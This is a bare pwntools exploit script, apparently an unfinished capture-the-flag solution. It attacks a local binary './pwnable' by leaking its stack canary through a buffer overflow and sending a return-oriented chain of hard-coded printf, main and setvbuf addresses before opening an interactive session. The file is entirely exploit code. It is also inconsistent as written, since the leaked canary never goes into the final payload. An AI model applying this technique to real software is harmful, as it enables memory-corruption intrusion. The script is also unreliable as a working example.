from pwn import *
from sys import *

p = process('./pwnable')
# leak canary
buff = "A" * 33
cmd = "b *0x08048482"
if(len(argv) == 3):
	gdb.attach(p, cmd)

p.sendline(buff)
p.recvuntil("A" * 33)
can = p.recv(3)
can = "\x00" + can
# can = u32(can)
# print(len(can))
# print(repr(can))
# print(hex(can))

# get printf address
impl_printf = p32(0x080485D0)
setvbuf     = p32(0x080483F8)
main        = p32(0x08048400)
# buff = "A" * 32 + can + "A" * (80 - 32 - 4)
pload = buff
pload += impl_printf
pload += main
pload += setvbuf
p.sendline(pload)
# p.recvuntil("A" * 80)
# # base = p.recv(4)
# # base = base - 99895
p.sendline("break")
p.interactive()


# 0xf7ddb637
# 0xf7dc3000


# 0xf7d5d000
# 0xf7d75637